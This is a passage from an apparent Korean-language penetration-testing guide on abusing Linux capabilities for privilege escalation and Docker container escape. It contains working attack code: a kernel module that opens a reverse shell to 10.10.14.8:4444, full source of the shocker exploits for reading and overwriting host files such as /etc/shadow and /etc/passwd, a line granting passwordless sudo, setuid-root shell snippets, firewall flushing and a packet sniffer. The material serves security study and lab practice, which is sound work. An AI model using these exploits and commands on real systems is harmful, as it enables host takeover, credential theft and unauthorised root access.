커널 모듈을 삽입하기 위해 **`insmod`** 명령을 사용할 수 있다는 의미입니다. 이 권한을 악용하여 **reverse shell**을 얻기 위해 아래 예제를 따르십시오.

**환경 예제 (Docker 탈출)**

다음 명령을 사용하여 도커 컨테이너 내에서 활성화된 권한을 확인할 수 있습니다:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **SYS_MODULE** 권한이 활성화되어 있음을 확인할 수 있습니다.

**리버스 셸**을 실행할 **커널 모듈**과 이를 **컴파일**할 **Makefile**을 **생성**하십시오:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile의 각 make 단어 앞의 공백은 **공백이 아닌 탭**이어야 합니다!

`make`를 실행하여 컴파일합니다.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
마지막으로, 셸 안에서 `nc`를 시작하고 다른 셸에서 **모듈을 로드**하면 nc 프로세스에서 셸을 캡처할 수 있습니다:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**이 기술의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **의 "SYS_MODULE Capability 남용" 실험실에서 복사되었습니다.**

이 기술의 또 다른 예는 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)에서 찾을 수 있습니다.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 는 프로세스가 **파일 읽기 및 디렉토리 읽기/실행에 대한 권한을 우회할 수 있도록** 합니다. 주된 용도는 파일 검색 또는 읽기 목적입니다. 그러나 이 기능은 프로세스의 마운트 네임스페이스 외부에 있는 파일을 포함하여 모든 파일에 접근할 수 있는 `open_by_handle_at(2)` 함수를 사용할 수 있게 합니다. `open_by_handle_at(2)`에서 사용되는 핸들은 `name_to_handle_at(2)`를 통해 얻은 비투명 식별자여야 하지만, 조작에 취약한 inode 번호와 같은 민감한 정보를 포함할 수 있습니다. 이 기능의 악용 가능성은 특히 Docker 컨테이너의 맥락에서 Sebastian Krahmer에 의해 shocker exploit로 입증되었습니다. [여기서 분석된](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 내용을 참조하십시오.
**이는 파일 읽기 권한 검사 및 디렉토리 읽기/실행 권한 검사를 우회할 수 있음을 의미합니다.**

**바이너리 예시**

바이너리는 모든 파일을 읽을 수 있습니다. 따라서 tar와 같은 파일이 이 권한을 가지고 있다면, 그림자 파일을 읽을 수 있게 됩니다:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Example with binary2**

이 경우 **`python`** 바이너리가 이 권한을 가지고 있다고 가정해 보겠습니다. 루트 파일을 나열하려면 다음과 같이 할 수 있습니다:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
파일을 읽기 위해 다음과 같이 할 수 있습니다:
```python
print(open("/etc/shadow", "r").read())
```
**환경 예제 (Docker 탈출)**

docker 컨테이너 내에서 활성화된 권한을 확인하려면 다음을 사용하세요:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 **DAC_READ_SEARCH** 권한이 활성화되어 있음을 알 수 있습니다. 결과적으로, 컨테이너는 **프로세스를 디버깅**할 수 있습니다.

다음의 익스플로잇이 어떻게 작동하는지에 대한 내용은 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)에서 확인할 수 있지만, 요약하자면 **CAP_DAC_READ_SEARCH**는 권한 확인 없이 파일 시스템을 탐색할 수 있게 해줄 뿐만 아니라, _**open_by_handle_at(2)**_에 대한 모든 검사를 명시적으로 제거하고 **다른 프로세스에 의해 열린 민감한 파일에 대한 접근을 허용할 수 있습니다**.

호스트에서 파일을 읽기 위해 이 권한을 악용하는 원래 익스플로잇은 여기에서 찾을 수 있습니다: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), 다음은 **읽고자 하는 파일을 첫 번째 인수로 지정하고 파일에 덤프할 수 있는 수정된 버전입니다.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> 이 익스플로잇은 호스트에 마운트된 무언가에 대한 포인터를 찾아야 합니다. 원래 익스플로잇은 파일 /.dockerinit을 사용했으며, 이 수정된 버전은 /etc/hostname을 사용합니다. 익스플로잇이 작동하지 않는다면 다른 파일을 설정해야 할 수도 있습니다. 호스트에 마운트된 파일을 찾으려면 mount 명령을 실행하세요:

![](<../../images/image (407) (1).png>)

**이 기술의 코드는** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **의 "DAC_READ_SEARCH Capability 악용" 실험실에서 복사되었습니다.**

## CAP_DAC_OVERRIDE

**이는 모든 파일에 대한 쓰기 권한 검사를 우회할 수 있음을 의미하므로, 어떤 파일이든 쓸 수 있습니다.**

특권 상승을 위해 **덮어쓸 수 있는 파일이 많이 있습니다,** [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리 예제**

이 예제에서 vim은 이 권한을 가지고 있으므로 _passwd_, _sudoers_ 또는 _shadow_와 같은 파일을 수정할 수 있습니다:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**이진 파일 2의 예**

이 예에서 **`python`** 이진 파일은 이 기능을 가집니다. 파일을 덮어쓰는 데 python을 사용할 수 있습니다:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**환경 + CAP_DAC_READ_SEARCH (Docker 탈출) 예제**

docker 컨테이너 내에서 활성화된 권한을 확인하려면 다음을 사용하세요:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
먼저 호스트의 [**DAC_READ_SEARCH 기능을 악용하여 임의의 파일을 읽는**](linux-capabilities.md#cap_dac_read_search) 이전 섹션을 읽고 **익스플로잇을 컴파일**하세요.\
그런 다음, 호스트 파일 시스템 내에서 **임의의 파일을 쓸 수 있는** 다음 버전의 쇼커 익스플로잇을 **컴파일**하세요:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker 컨테이너에서 탈출하기 위해서는 호스트에서 `/etc/shadow` 및 `/etc/passwd` 파일을 **다운로드**하고, 여기에 **새 사용자**를 **추가**한 다음, **`shocker_write`**를 사용하여 이를 덮어쓸 수 있습니다. 그런 다음 **ssh**를 통해 **접속**합니다.

**이 기술의 코드는** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **의 "DAC_OVERRIDE Capability 남용" 실험실에서 복사되었습니다.**

## CAP_CHOWN

**이는 모든 파일의 소유권을 변경할 수 있음을 의미합니다.**

**바이너리 예시**

**`python`** 바이너리가 이 권한을 가지고 있다고 가정하면, **shadow** 파일의 **소유자**를 **변경**하고, **루트 비밀번호**를 **변경**하며, 권한을 상승시킬 수 있습니다:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
또는 **`ruby`** 바이너리가 이 권한을 가지고 있는 경우:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**이는 모든 파일의 권한을 변경할 수 있음을 의미합니다.**

**바이너리 예시**

python이 이 기능을 가지고 있다면, shadow 파일의 권한을 수정하고, **루트 비밀번호를 변경**하며, 권한을 상승시킬 수 있습니다:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**이것은 생성된 프로세스의 유효 사용자 ID를 설정할 수 있음을 의미합니다.**

**바이너리 예시**

만약 python이 이 **capability**를 가지고 있다면, 이를 이용해 루트 권한으로 권한 상승을 매우 쉽게 할 수 있습니다:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**또 다른 방법:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**이는 생성된 프로세스의 유효 그룹 ID를 설정할 수 있음을 의미합니다.**

권한을 상승시키기 위해 **덮어쓸 수 있는 파일이 많이 있습니다,** [**여기에서 아이디어를 얻을 수 있습니다**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**바이너리 예제**

이 경우, 그룹이 읽을 수 있는 흥미로운 파일을 찾아야 합니다. 왜냐하면 어떤 그룹으로도 가장할 수 있기 때문입니다:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
파일을 찾아서 권한 상승을 위해 악용할 수 있는 경우(읽기 또는 쓰기를 통해) **흥미로운 그룹을 가장하는 셸을 얻을 수 있습니다**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
이 경우 그룹 shadow가 가장해져서 `/etc/shadow` 파일을 읽을 수 있습니다:
```bash
cat /etc/shadow
```
만약 **docker**가 설치되어 있다면, **docker group**을 **가장**하고 이를 악용하여 [**docker socket**와 통신하고 권한을 상승시킬 수 있습니다](./#writable-docker-socket).

## CAP_SETFCAP

**이는 파일과 프로세스에 권한을 설정할 수 있음을 의미합니다.**

**바이너리 예시**

만약 python이 이 **권한**을 가지고 있다면, 이를 악용하여 루트 권한으로 상승시키는 것이 매우 쉽습니다:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> CAP_SETFCAP로 이진 파일에 새 권한을 설정하면 이 권한을 잃게 됩니다.

[SETUID capability](linux-capabilities.md#cap_setuid)를 얻으면 권한 상승 방법을 보려면 해당 섹션으로 이동할 수 있습니다.

**환경 예시 (Docker 탈출)**

기본적으로 **CAP_SETFCAP 권한은 Docker의 컨테이너 내부 프로세스에 부여됩니다**. 다음과 같은 방법으로 확인할 수 있습니다:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
이 기능은 **이진 파일에 다른 모든 기능을 부여할 수 있게 해줍니다**, 따라서 우리는 이 페이지에 언급된 **다른 기능 탈출을 악용하여** 컨테이너에서 **탈출**할 수 있다고 생각할 수 있습니다.\
그러나 예를 들어 gdb 이진 파일에 CAP_SYS_ADMIN 및 CAP_SYS_PTRACE 기능을 부여하려고 하면, 부여할 수는 있지만 **이진 파일은 이후에 실행할 수 없다는 것을 알게 될 것입니다**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP_SETPCAP** capability in its effective set._\
Permitted capabilities는 사용할 수 있는 것들을 제한하는 것처럼 보입니다.\
그러나 Docker는 기본적으로 **CAP_SETPCAP**를 부여하므로, **상속 가능한 것들 안에서 새로운 능력을 설정할 수 있을지도 모릅니다**.\
그러나 이 능력의 문서에서는: _CAP_SETPCAP : \[…] **호출 스레드의 경계** 집합에서 상속 가능한 집합에 능력을 추가합니다_.\
우리는 경계 집합에서 상속 가능한 집합으로만 추가할 수 있는 것처럼 보입니다. 이는 **CAP_SYS_ADMIN 또는 CAP_SYS_PTRACE와 같은 새로운 능력을 상속 집합에 넣어 권한을 상승시킬 수 없음을 의미합니다**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` 시스템 호출 접근, 다양한 디스크 명령을 포함한 여러 민감한 작업을 제공합니다. `FIBMAP ioctl(2)`도 이 능력을 통해 활성화되며, 이는 [과거에](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) 문제를 일으켰습니다. 매뉴얼 페이지에 따르면, 이는 보유자가 다른 장치에서 장치별 작업을 설명적으로 `수행할 수 있게 합니다`.

이는 **권한 상승** 및 **Docker 탈출**에 유용할 수 있습니다.

## CAP_KILL

**이는 모든 프로세스를 종료할 수 있음을 의미합니다.**

**바이너리 예시**

**`python`** 바이너리가 이 능력을 가지고 있다고 가정해 보겠습니다. 만약 **서비스나 소켓 구성** (또는 서비스와 관련된 구성 파일) 파일을 **수정할 수 있다면**, 이를 백도어로 만들고, 그 서비스와 관련된 프로세스를 종료한 다음, 새로운 구성 파일이 당신의 백도어와 함께 실행되기를 기다릴 수 있습니다.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill로 권한 상승**

kill 권한이 있고 **root로 실행 중인 node 프로그램**(또는 다른 사용자로 실행 중인 경우)이 있다면, 아마도 **SIGUSR1 신호**를 보내서 **node 디버거**를 열 수 있을 것입니다. 그곳에서 연결할 수 있습니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}

## CAP_NET_BIND_SERVICE

**이는 모든 포트(특권 포트에서도)에서 수신할 수 있음을 의미합니다.** 이 권한으로 직접적으로 권한 상승을 할 수는 없습니다.

**바이너리 예시**

만약 **`python`**이 이 권한을 가지고 있다면, 모든 포트에서 수신할 수 있으며, 다른 포트로 연결할 수도 있습니다(일부 서비스는 특정 특권 포트에서의 연결을 요구합니다).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 프로세스가 **RAW 및 PACKET 소켓을 생성**할 수 있도록 하여 임의의 네트워크 패킷을 생성하고 전송할 수 있게 합니다. 이는 패킷 스푸핑, 트래픽 주입 및 네트워크 접근 제어 우회를 포함한 보안 위험을 초래할 수 있습니다. 악의적인 행위자는 이를 이용해 컨테이너 라우팅에 간섭하거나 호스트 네트워크 보안을 위협할 수 있으며, 특히 적절한 방화벽 보호가 없는 경우에 더욱 그렇습니다. 또한, **CAP_NET_RAW**는 RAW ICMP 요청을 통한 ping과 같은 작업을 지원하기 위해 권한이 있는 컨테이너에 필수적입니다.

**이는 트래픽을 스니핑할 수 있음을 의미합니다.** 이 권한으로 직접적으로 권한 상승을 할 수는 없습니다.

**바이너리 예시**

바이너리 **`tcpdump`**가 이 권한을 가지고 있다면, 네트워크 정보를 캡처하는 데 사용할 수 있습니다.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
**환경**이 이 기능을 제공하는 경우 **`tcpdump`**를 사용하여 트래픽을 스니핑할 수도 있습니다.

**이진수 2의 예**

다음 예는 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용할 수 있는 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)에서 "_기초: CAP-NET_BIND + NET_RAW_" 실험실의 것입니다.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 소유자에게 **네트워크 구성 변경**의 권한을 부여합니다. 여기에는 방화벽 설정, 라우팅 테이블, 소켓 권한 및 노출된 네트워크 네임스페이스 내의 네트워크 인터페이스 설정이 포함됩니다. 또한 네트워크 인터페이스에서 **promiscuous mode**를 활성화하여 네임스페이스 간의 패킷 스니핑을 허용합니다.

**이진 파일 예시**

**python binary**가 이러한 권한을 가지고 있다고 가정해 보겠습니다.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**이는 inode 속성을 수정할 수 있음을 의미합니다.** 이 권한으로 직접적으로 권한을 상승시킬 수는 없습니다.

**바이너리 예시**

파일이 불변이며 python이 이 권한을 가지고 있다면, **불변 속성을 제거하고 파일을 수정 가능하게 만들 수 있습니다:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

